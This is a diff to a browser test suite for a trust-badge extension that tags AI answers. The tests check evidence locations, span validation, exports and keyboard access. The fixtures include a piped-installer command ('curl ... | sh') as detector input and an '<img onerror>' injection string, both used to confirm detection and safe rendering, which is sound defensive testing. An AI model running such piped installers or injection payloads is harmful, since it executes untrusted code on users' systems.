@@ -31,7 +31,7 @@ async (page) => {
     assert(exported.tags[0].signals[0].id.includes('<img'),'unknown signal preserved as JSON data');
     assert(exported.training_label===null&&exported.review_status==='unreviewed_detector_output','prediction is not a ground-truth label');
     assert(!JSON.stringify(exported).includes(fixtureRequests[0].text),'source response text excluded from export');
-    const brief=root(first).querySelector('.evidence').textContent;
+    const brief=[...root(first).querySelectorAll('.evidence .brief')].map(p=>p.textContent).join(' ');
     assert(brief.split(/\s+/).length<=45&&!/SHA-256|Method score|Tag record:/.test(brief),'brief excludes technical detail');
     const panel=root(first).querySelector('.panel');
     root(first).querySelector('.close').click();
@@ -112,6 +112,36 @@ async (page) => {
     return {allDistinctTags:true,syntheticTagCount:codes.length,duplicatesSuppressed:true,outputGeometryUnchanged:true,belowOutput:true,narrowRowWrap:true,perTagDetails:true};
   });
   result.multipleTags=multipleTags;
+  const evidenceLocations=await page.evaluate(async()=>{
+    const assert=(condition,message)=>{if(!condition)throw Error(message);};
+    const host=document.createElement('article');host.textContent='Visible answer unchanged.';document.body.append(host);
+    const assertion=fixtureResult('Run curl https://example.test/install | sh').assertion;
+    assertion.tags=[{code:'PS',signals:[{id:'sig.piped_installer.v3',spans:[[4,16],[0,0],[-1,8],[4,999999],[0,1.5]]},{id:'<img onerror=alert(1)>',spans:[[16,20]]}]},{code:'PII_REDACTED',signals:[{id:'presidio.entity.v1'}]}];
+    AITrust.mount(host,()=>{});AITrust.update(host,'FINDING',assertion);
+    const root=fixtureRoots.get(host.querySelector('.aitrust-mount'));
+    root.querySelector('[data-code="PS"]').click();
+    let detail=root.querySelector('details');
+    assert(detail&&!detail.open,'matched locations collapsed by default');
+    assert(detail.textContent.includes('characters 4–16 (end excluded)')&&detail.textContent.includes('characters 16–20 (end excluded)'),'exact bounded evaluated positions shown');
+    assert(!detail.textContent.includes('999999')&&!detail.textContent.includes('0–0')&&!root.querySelector('img'),'malformed spans and hostile HTML excluded');
+    assert(detail.textContent.includes('redacted text')&&detail.textContent.includes('differ from this answer'),'coordinate boundary explained');
+    assert(!root.querySelector('.export-note').hidden&&root.querySelector('.export-note').textContent.includes('link or reveal'),'export correlation warning visible');
+    root.querySelector('.close').click();root.querySelector('[data-code="PII_REDACTED"]').click();
+    detail=root.querySelector('details');
+    assert(detail.textContent.includes('no character positions provided')&&!detail.textContent.includes('4–16'),'redaction does not invent or borrow positions');
+    root.querySelector('.close').click();
+    assertion.tags[0].signals=[{id:'sig.piped_installer.v3',spans:Array.from({length:30},(_,i)=>[i,i+1])}];
+    AITrust.update(host,'FINDING',assertion);root.querySelector('[data-code="PS"]').click();
+    detail=root.querySelector('details');assert(detail.querySelectorAll('li').length===20&&detail.textContent.includes('20 of 30'),'large list bounded and disclosed');
+    let blob;const original=URL.createObjectURL;URL.createObjectURL=value=>{blob=value;return original.call(URL,value);};
+    try{root.querySelector('.export').click();}finally{URL.createObjectURL=original;}
+    const exported=JSON.parse(await blob.text());assert(exported.tags[0].signals[0].spans.length===30,'full positions preserved in explicit download');
+    root.querySelector('.close').click();AITrust.update(host,'UNAVAILABLE');root.querySelector('.tag').click();
+    assert(root.querySelector('.export-note').hidden&&root.querySelector('.export').hidden&&!root.querySelector('details'),'unavailable has no fabricated evidence or export');
+    root.querySelector('.close').click();AITrust.unmount(host);host.remove();
+    return {collapsed:true,exactEvaluatedPositions:true,malformedSpanFallback:true,selectedTagOnly:true,unknownIdentifierSafe:true,redactionWithoutInventedOffsets:true,renderLimit:20,completeDownload:true,visibleExportBoundary:true};
+  });
+  result.evidenceLocations=evidenceLocations;
   // Exercise component contracts through real keyboard/browser settings, not requested flags.
   await page.goto('http://127.0.0.1:8799/extension/test/badge-fixture.html');
   await page.waitForFunction(()=>fixtureRequests.length===2);
@@ -123,6 +153,10 @@ async (page) => {
   if(!reached)throw Error('Tag is not keyboard reachable');
   await page.keyboard.press('Enter');
   if(!await page.evaluate(()=>fixtureRoots.get(document.querySelector('#first .aitrust-mount')).querySelector('.panel').open))throw Error('Keyboard Enter does not open details');
+  await page.evaluate(()=>fixtureRoots.get(document.querySelector('#first .aitrust-mount')).querySelector('summary').focus());
+  await page.keyboard.press('Enter');
+  if(!await page.evaluate(()=>fixtureRoots.get(document.querySelector('#first .aitrust-mount')).querySelector('details').open))throw Error('Matched locations are not keyboard operable');
+  result.evidenceLocations.keyboardDisclosure=true;
   await page.keyboard.press('Escape');
   if(!await page.evaluate(()=>{const r=fixtureRoots.get(document.querySelector('#first .aitrust-mount'));return !r.querySelector('.panel').open&&r.activeElement?.classList.contains('tag');}))throw Error('Keyboard Escape does not restore tag focus');
   await page.addScriptTag({url:'http://127.0.0.1:8799/scripts/badge-probes.js'});
@@ -145,6 +179,7 @@ async (page) => {
   const mutations=await page.evaluate(()=>{
     const root=fixtureRoots.get(document.querySelector('#first .aitrust-mount'));const style=document.createElement('style');root.append(style);const caught=[];
     for(const [name,rule] of [['color','.tag{color:red!important}'],['overflow','.tag{width:900px!important;flex-shrink:0!important}'],['motion','.tag{transition:all 5s!important}']]){style.textContent=rule;if(!badgeProbes.inspect(root).length)throw Error('Probe missed '+name);caught.push(name);}
+    const live=document.querySelector('.aitrust-mount[role="status"]');live.setAttribute('aria-live','assertive');if(!badgeProbes.inspect(root).includes('tag announcement is not polite'))throw Error('Probe missed assertive announcement');live.setAttribute('aria-live','polite');caught.push('assertive');
     style.remove();return caught;
   });
   result.componentContract={closedShadow:true,keyboardReachEnterEscape:true,lightDarkMonochrome:true,forcedColorsInspected:true,zoom200Inspected:true,reducedMotionInspected:true,deliberateDefectsCaught:mutations};
